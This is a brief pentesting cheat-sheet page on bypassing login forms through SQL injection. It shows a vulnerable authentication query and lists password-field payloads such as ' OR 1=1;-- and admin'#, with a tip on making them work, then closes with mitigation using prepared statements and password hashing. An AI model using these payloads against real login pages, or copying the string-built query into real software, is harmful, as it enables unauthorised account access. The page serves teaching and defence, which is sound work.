# Authentication Bypass

This method consists of considering that the web application isn't interested in the content of the username and password, but in making a matching pair in the users' table.

* We assume the database uses a basic query for authentication

{% code overflow="wrap" lineNumbers="true" %}
```sql
SELECT * from users WHERE username='%user%' and password='%password%' LIMIT 1;
```
{% endcode %}

{% hint style="info" %}
_%user%_ and _%password%_ are the values received on a login form
{% endhint %}

***

* We can do a malicious insertion on the password field

{% code overflow="wrap" lineNumbers="true" %}
```sql
'--   #Use this comparison to cheat on verification
' OR 1=1;--   #Another alternative
'+OR+1=1-- #Another alternative
#This will skip the password verification and enumerate all the users
```
{% endcode %}

{% hint style="info" %}
Sometimes, an extra space after `;--` could make it work
{% endhint %}

***

* On PHP-based pages, we can replicate the same with a different payload

{% code overflow="wrap" lineNumbers="true" %}
```java
admin'#      //Insert this to skip the password verification
```
{% endcode %}

## <mark style="color:blue;">Mitigation</mark>

It's correct to use prepared statements to force the database to treat user input as data, not executable code, so these kinds of payloads become harmless strings. For example:

{% code title="Example_PHP_Implementation" lineNumbers="true" %}
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$user = $stmt->fetch();
```
{% endcode %}

***

Also, we should never store passwords in plaintext and compare them in the same way. She should store password hashes using algorithms like bcrypt/argon2 and verify them server-side.
